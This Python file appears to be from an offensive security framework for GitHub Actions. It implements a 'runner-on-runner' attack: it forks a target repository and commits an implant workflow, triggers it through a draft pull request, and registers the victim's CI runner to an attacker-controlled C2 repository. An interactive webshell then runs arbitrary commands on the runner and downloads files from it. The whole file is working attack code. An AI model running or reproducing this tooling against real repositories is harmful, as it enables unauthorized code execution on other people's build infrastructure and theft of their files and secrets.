"""
Copyright 2025, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import asyncio
import base64
import random
import string
import re
import datetime

from gatox.attack.attack import Attacker
from gatox.cli.output import Output
from gatox.attack.payloads.payloads import Payloads


class WebShell(Attacker):
    """This class wraps implementation to create a C2 repository that can be used to
    connect a runner-on-runner (RoR).

    The steps to create a RoR C2 repository are as follows:

    * Create a repository with a shell.yml workflow that runs on workflow dispatch.
    * The workflow dispatch event will trigger the workflow to run on the runner.
    * The runner will then execute the shell commands in the workflow.

    The attacker can then use the GitHub API to trigger the workflow dispatch event
    and execute commands on the runner.

    The implantation portion will use a self-hosted registration token from the GitHub
    API.

    """

    LINE_PATTERN = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{7}Z\s(.*)$")

    async def setup_payload_gist_and_workflow(
        self, c2_repo, target_os, target_arch, keep_alive=False
    ):
        """
        Sets up a payload in the form of a GitHub Gist and a GitHub Actions workflow in the specified command and control repository.

        This method formats a runner-on-runner (RoR) Gist payload based on the command and control repository URL, target operating system, and architecture.
        It then creates a Gist with this payload and outputs information about the successful creation of the Gist.

        Parameters:
        - c2_repo (str): The URL of the command and control (C2) repository where the GitHub Actions workflow will be set up.
        - target_os (str): The target operating system for the payload (e.g., 'linux', 'windows').
        - target_arch (str): The target architecture for the payload (e.g., 'amd64', 'x86').
        - keep_alive (bool, optional): Whether the payload should attempt to keep the connection alive. Defaults to False.

        Returns:
        - tuple: A tuple containing the Gist ID and the URL of the created Gist.
        """

        ror_gist = await self.format_ror_gist(
            c2_repo, target_os, target_arch, keep_alive=keep_alive
        )

        if not ror_gist:
            Output.error("Failed to format runner-on-runner Gist!")
            return None, None

        gist_id, gist_url = await self.create_gist("runner", ror_gist)

        if not gist_url:
            return None, None

        Output.info(f"Successfully created runner-on-runner Gist at {gist_url}!")

        return gist_id, gist_url

    async def payload_only(
        self,
        target_os: str,
        target_arch: str,
        requested_labels: list,
        keep_alive: bool = False,
        c2_repo: str = None,
        workflow_name: str = "Testing",
        run_name: str = "Testing",
    ):
        """Generates payload gist and prints RoR workflow."""
        await self.setup_user_info()

        if not c2_repo:
            c2_repo = await self.configure_c2_repository()
            Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
        else:
            Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")

        _, gist_url = await self.setup_payload_gist_and_workflow(
            c2_repo, target_os, target_arch, keep_alive=keep_alive
        )

        if not gist_url:
            Output.error("Failed to create Gist!")
            return

        ror_workflow = Payloads.create_ror_workflow(
            workflow_name, run_name, gist_url, requested_labels, target_os=target_os
        )

        Output.info("RoR Workflow below:\n")
        print(ror_workflow)

    async def runner_on_runner(
        self,
        target_repo: str,
        target_branch: str,
        pr_title: str,
        source_branch: str,
        commit_message: str,
        target_os: str,
        target_arch: str,
        requested_labels: list,
        keep_alive: bool = False,
        yaml_name: str = "tests",
        workflow_name: str = "Testing",
        run_name: str = "Testing",
        c2_repo: str = None,
    ):
        """Performs a runner-on-runner attack using the fork pull request technique.

        This feature uses the pure git database API to perform operations.
        """
        await self.setup_user_info()

        if not self.user_perms:
            return False

        if not (
            "repo" in self.user_perms["scopes"]
            and "workflow" in self.user_perms["scopes"]
            and "gist" in self.user_perms["scopes"]
        ):
            Output.error("Insufficient scopes for attacker PAT!")
            return False

        if not c2_repo:
            c2_repo = await self.configure_c2_repository()
            Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
        else:
            Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")

        gist_id, gist_url = await self.setup_payload_gist_and_workflow(
            c2_repo, target_os, target_arch, keep_alive=keep_alive
        )

        ror_workflow = Payloads.create_ror_workflow(
            workflow_name, run_name, gist_url, requested_labels, target_os=target_os
        )

        Output.info(
            f"Conducting an attack against {Output.bright(target_repo)} as the "
            f"user: {Output.bright(self.user_perms['user'])}!"
        )

        res = await self.api.get_repo_branch(target_repo, target_branch)
        if res == 0:
            Output.error(f"Target branch, {target_branch}, does not exist!")
            return False
        elif res == -1:
            Output.error("Failed to check for target branch!")
            return False

        repo_name = await self.api.fork_repository(target_repo)
        if not repo_name:
            Output.error("Error while forking repository!")
            return False

        for i in range(self.timeout):
            status = await self.api.get_repository(repo_name)
            if status:
                Output.result(f"Successfully created fork: {repo_name}!")
                await asyncio.sleep(5)
                break
            else:
                await asyncio.sleep(1)

        if not status:
            Output.error(f"Forked repository not found after {self.timeout} seconds!")
            return False

        # Commit implantation workflow on fork, removing all other workflow files.
        status = await self.api.commit_workflow(
            repo_name,
            source_branch,
            ror_workflow.encode(),
            f"{yaml_name}.yml",
            commit_author=self.author_name,
            commit_email=self.author_email,
        )

        if not status:
            Output.error("Failed to commit RoR workflow to fork!")
            return False

        Output.info("C2 Repo and Fork Prepared for attack!")
        Output.warn(
            "The following steps perform an automated overt attack. Type 'Confirm' to continue."
        )

        user_input = input()

        if user_input.lower() != "confirm":
            Output.warn("Exiting attack!")
            return False

        Output.info("Creating draft pull request!")
        pull_url = await self.api.create_pull_request(
            repo_name,
            source_branch,
            target_repo,
            target_branch,
            pr_body="Gato-X CI/CD Test",
            pr_title=pr_title,
            draft=True,
        )

        if pull_url:
            Output.result(f"Successfully created draft pull request: {pull_url}")
        else:
            Output.error("Failed to create draft pull request!")
            return False

        curr_time = (
            datetime.datetime.now(tz=datetime.timezone.utc)
            .replace(microsecond=0)
            .isoformat()
        )

        for i in range(self.timeout):
            workflow_id = await self.api.get_recent_workflow(
                target_repo, "", yaml_name, time_after=f">{curr_time}"
            )
            if workflow_id == -1:
                Output.error("Failed to find the created workflow!")
                return
            elif workflow_id > 0:
                break
            else:
                await asyncio.sleep(1)
        else:
            Output.error(
                "Failed to find the triggered workflow - actions might be disabled!"
            )
            return

        Output.info("Closing pull request!")
        close_res = await self.api.backtrack_head(repo_name, source_branch, 1)
        if close_res:
            Output.result("Successfully closed pull request!")
        else:
            Output.error("Failed to close pull request!")

        # Get workflow status
        status = await self.api.get_workflow_status(target_repo, workflow_id)
        if status == -1:
            Output.warn("Workflow requires approval!")
            Output.warn("Waiting until timeout in case of approval via other means.")
        else:
            Output.info("Polling for runners!")
        for i in range(self.timeout):
            runners = await self.api.get_repo_runners(c2_repo)
            if runners:
                Output.owned("Runner connected to C2 repository!")
                Output.info("Deleting implantation Gist.")
                await self.api.call_delete(f"/gists/{gist_id}")
                self.interact_webshell(c2_repo, runner_name=runners[0]["name"])
                break
            else:
                await asyncio.sleep(1)
        else:
            Output.warn("No runners connected to C2 repository!")
            return False

    async def interact_webshell(self, c2_repo: str, runner_name: str = None):
        """Interacts with the webshell to issue commands."""

        await self.setup_user_info()

        if "repo" not in self.user_perms["scopes"]:
            Output.error("Insufficient scopes for C2 operator PAT!")
            return False

        # If the user has not provided a full repository name, then assume it is in the user's personal account.
        # Otherwise, support the full repository name, in case someone is collaborating.
        if "/" not in c2_repo:
            username = self.user_perms["user"]
            c2_repo = f"{username}/{c2_repo}"

        runners = await self.api.get_repo_runners(c2_repo)
        if runners:
            runner_name = runners[0]["name"]
        else:
            Output.error("No runners connected to C2 repository!")
            return False

        Output.info("Welcome to the Gato-X Webshell! Type 'exit' or '!exit' to exit.")
        Output.info(
            "The following meta commands are available, anything else will be sent to the target:"
        )
        Output.tabbed(
            "!list_runners - Lists all runners and labels connected to the C2 repository."
        )
        Output.tabbed("!select - Change the runner selection.")
        Output.tabbed(
            "!download SOURCE - Download the specified file from the runner as a workflow artifact. E.g.: !download /etc/passwd"
        )
        Output.tabbed(
            "!timeout - Change the timeout value in seconds, this can be useful for long running commands. Example: !timeout 500"
        )

        try:
            while True:
                command = input(f"Command({Output.red(runner_name)})$ ")
                if command == "exit" or command == "!exit":
                    print("Exiting shell...")
                    break
                elif command == "!list_runners":
                    await self.list_runners(c2_repo)
                elif command.startswith("!select"):
                    parts = command.split(" ")
                    if len(parts) == 2:
                        runner_name = parts[1]
                    else:
                        Output.error("Invalid runner select command!")
                elif command.startswith("!download"):
                    parts = command.split(" ")
                    if len(parts) == 2:
                        file_download = parts[1]
                    await self.issue_command(
                        c2_repo,
                        file_download,
                        timeout=self.timeout,
                        runner_name=runner_name,
                        download=True,
                    )
                elif command.startswith("!timeout"):
                    parts = command.split(" ")
                    if len(parts) == 2:
                        self.timeout = int(parts[1])
                        Output.info(f"Timeout set to {self.timeout} seconds.")
                    else:
                        Output.error("Invalid timeout command!")
                elif command:
                    await self.issue_command(
                        c2_repo, command, timeout=self.timeout, runner_name=runner_name
                    )
                else:
                    Output.error("Command was empty!")

        except KeyboardInterrupt:
            print("Exiting shell...")

    async def configure_c2_repository(self):
        """Configures a C2 repository and returns the repository name along with
        the runner registration token.
        """
        random_name = "".join(random.choices(string.ascii_letters, k=10))

        # Create private repository in the user's personal account.
        repo_name = await self.api.create_repository(random_name)

        if repo_name:
            await self.api.commit_file(
                repo_name,
                "main",
                ".github/workflows/webshell.yml",
                file_content=Payloads.ROR_SHELL,
            )

            return repo_name
        else:
            Output.error("Unable to create C2 repository!")
            return None

    async def format_ror_gist(
        self,
        c2_repo: string,
        target_os: string,
        target_arch: string,
        keep_alive: bool = False,
    ):
        """Configures a Gist file used to install the runner-on-runner implant."""

        # Get latest actions/runner version for arch and OS.
        releases = await self.api.call_get(
            "/repos/actions/runner/releases", params={"per_page": 1}
        )

        if releases.status_code == 200:
            release = releases.json()
            name = release[0]["tag_name"]
            version = name[1:]

            # File name varies by OS.
            release_file = f"actions-runner-{target_os}-{target_arch}-{version}.{target_os == 'win' and 'zip' or 'tar.gz'}"
            token_resp = await self.api.call_post(
                f"/repos/{c2_repo}/actions/runners/registration-token"
            )
            if token_resp.status_code == 201:
                registration_token = token_resp.json()["token"]
            else:
                Output.error(f"Unable to retrieve registration token for {c2_repo}!")
                return None

            random_name = "".join(random.choices(string.ascii_letters, k=5))
            if target_os == "linux":
                return Payloads.ROR_GIST.format(
                    base64.b64encode(registration_token.encode()).decode(),
                    c2_repo,
                    release_file,
                    name,
                    "true" if keep_alive else "false",
                    random_name,
                )
            elif target_os == "win":
                return Payloads.ROR_GIST_WINDOWS.format(
                    registration_token,
                    c2_repo,
                    release_file,
                    name,
                    "true" if keep_alive else "false",
                    random_name,
                )
            elif target_os == "osx":
                return Payloads.ROR_GIST_MACOS.format(
                    registration_token,
                    c2_repo,
                    release_file,
                    name,
                    "true" if keep_alive else "false",
                    random_name,
                )
        else:
            Output.error("Unable to retrieve runner version!")
            return None

    async def issue_command(
        self,
        c2_repo,
        parameter,
        timeout=30,
        workflow_name="webshell.yml",
        runner_name="gato-ror",
        download=False,
    ):
        """
        This function is used to issue a command to a GitHub
        Actions runner and retrieve the output.

        Parameters:
            c2_repo (str): The name of the repository. It should be in the format 'owner/repo'.
            paramater (str): The command to be executed on the runner.
            timeout (int, optional): The maximum time to wait for the workflow to complete.
                Default is 30 seconds.
            workflow_name (str, optional): The name of the workflow file
                (without the .yml extension). Default is 'webshell.yml'.
            runner_name (str, optional): The name of the runner where the
                command will be executed. Default is 'gato-ror'.
            download (bool, optional): If True, the parameter is treated as a file to download.

        Returns:
            None

        Raises:
            None

        Example:
            issue_command('octocat/Hello-World', 'ls -la')
        """
        dispatch_input = {"runner": runner_name}

        if download:
            dispatch_input["download_file"] = parameter
        else:
            dispatch_input["cmd"] = parameter

        curr_time = (
            datetime.datetime.now(tz=datetime.timezone.utc)
            .replace(microsecond=0)
            .isoformat()
        )
        success = await self.api.issue_dispatch(
            c2_repo,
            target_workflow=workflow_name,
            target_branch="main",
            dispatch_inputs=dispatch_input,
        )

        if success:
            await asyncio.sleep(5)
            resp = await self.api.call_get(
                f"/repos/{c2_repo}/commits", params={"per_page": 1}
            )
            if resp.status_code == 200:
                for i in range(timeout):
                    workflow_id = await self.api.get_recent_workflow(
                        c2_repo,
                        resp.json()[0]["sha"],
                        "webshell",
                        time_after=f">{curr_time}",
                    )
                    if workflow_id == -1:
                        Output.error("Failed to find the created workflow!")
                        return
                    elif workflow_id > 0:
                        break
                    else:
                        await asyncio.sleep(1)
                else:
                    Output.error("Failed to find the created workflow!")
                    return

                for i in range(self.timeout):
                    status = await self.api.get_workflow_status(c2_repo, workflow_id)
                    if status == -1 or status == 1:
                        # We just need it to finish.
                        break
                    else:
                        await asyncio.sleep(1)
                else:
                    Output.error(
                        "The workflow is incomplete but hit the timeout, "
                        "check the C2 repository manually to debug!"
                    )
                    return False

                # If downloading file, then download and don't try to parse run log.
                if download:
                    dest = await self.api.download_workflow_artifact(
                        c2_repo, workflow_id, f"{str(workflow_id)}_exfil.zip"
                    )

                    if dest:
                        Output.info("Downloaded file to: " + dest)
                    else:
                        Output.error("Unable to download artifact!")
                else:
                    #  Download the run logs. Iterate lines until
                    #  we see "2024-06-14T15:20:38.9545224Z   RUNNER_TRACKING_ID: 0"
                    runlog = await self.api.retrieve_workflow_log(
                        c2_repo, workflow_id, "build"
                    )
                    content_lines = runlog.split("\n")
                    grp_cnt = 0
                    for line in content_lines:
                        if "##[endgroup]" in line and grp_cnt != 2:
                            grp_cnt += 1
                            continue

                        if "Cleaning up orphan processes" in line:
                            break

                        if grp_cnt == 2:
                            match = self.LINE_PATTERN.match(line)
                            if match:
                                print(match.group(1))
                            else:
                                break

        else:
            Output.error("Unable to issue command!")

    async def list_runners(self, c2_repo):
        """Lists all runners connected to the C2 repository."""
        runners = await self.api.get_repo_runners(c2_repo)

        if runners:
            Output.info(f"There are {len(runners)} runner(s) connected to {c2_repo}:")
            for runner in runners:
                runner_name = runner["name"]

                labels = ", ".join(
                    [Output.yellow(label["name"]) for label in runner["labels"]]
                )
                status = runner["status"]
                Output.tabbed(
                    f"Name: {Output.red(runner_name)} - Labels: {labels} - Status: {Output.bright(status)}"
                )
        else:
            Output.error("No runners connected to C2 repository!")
